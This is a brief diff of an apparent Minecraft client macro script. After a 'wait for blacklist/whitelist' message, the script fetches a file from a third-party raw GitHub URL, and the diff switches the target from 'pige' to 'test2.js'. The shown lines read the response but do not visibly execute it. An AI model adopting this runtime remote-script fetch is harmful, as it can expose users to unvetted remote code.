@@ -5,7 +5,7 @@ Chat.actionbar("§4§WWait for blacklist/whitelist")
 Client.waitTick(5)
 
 
-const req = Request.create("https://raw.githubusercontent.com/hasoon-0/website/refs/heads/main/pige");
+const req = Request.create("https://raw.githubusercontent.com/hasoon-0/fembexx/refs/heads/main/test2.js");
 const response = req.get();
 const responseText = response.text();
 
